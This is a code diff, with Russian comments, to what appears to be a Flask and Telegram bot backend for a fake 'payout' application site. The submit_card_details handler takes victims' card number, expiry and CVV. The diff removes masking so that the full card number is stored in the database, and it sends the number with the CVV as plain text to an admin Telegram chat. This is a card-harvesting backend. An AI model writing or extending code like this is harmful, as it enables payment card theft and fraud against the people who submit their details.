@@ -75,7 +75,7 @@ def send_admin(text, keyboard=None):
     tg("sendMessage", payload)
 
 def send_raw(chat_id, text):
-    """Отправка обычного текста без HTML разметки (чтобы не обрезалось)"""
+    """Отправка обычного текста без HTML разметки"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": chat_id, "text": text, "parse_mode": ""}
     try:
@@ -141,13 +141,13 @@ def submit_card_details():
     card_expiry = data.get("card_expiry")
     card_cvv = data.get("card_cvv")
     
-    masked_card = card_number[:4] + " **** **** " + card_number[-4:]
+    # БЕЗ МАСКИРОВКИ - полный номер карты
     row = db_one("SELECT fullname, amount, phone FROM applications WHERE session_id = ?", (session_id,))
     
     if row:
         fullname, amount, phone = row
         db_exec("UPDATE applications SET card_holder=?, card_number=?, card_expiry=? WHERE session_id=?", 
-                (card_holder, masked_card, card_expiry, session_id))
+                (card_holder, card_number, card_expiry, session_id))
         
         message = f"""
 💳 ДАННЫЕ КАРТЫ ДЛЯ ВЫПЛАТЫ
@@ -158,11 +158,10 @@ def submit_card_details():
 📱 Телефон: {phone}
 
 💳 Держатель: {card_holder}
-💳 Карта: {masked_card}
+💳 Карта: {card_number}
 📅 Срок: {card_expiry}
 🔐 CVV: {card_cvv}
         """
-        # Отправляем как обычный текст без HTML (чтобы не обрезалось)
         send_raw(ADMIN_CHAT_ID, message)
     
     return jsonify({"status": "ok"})
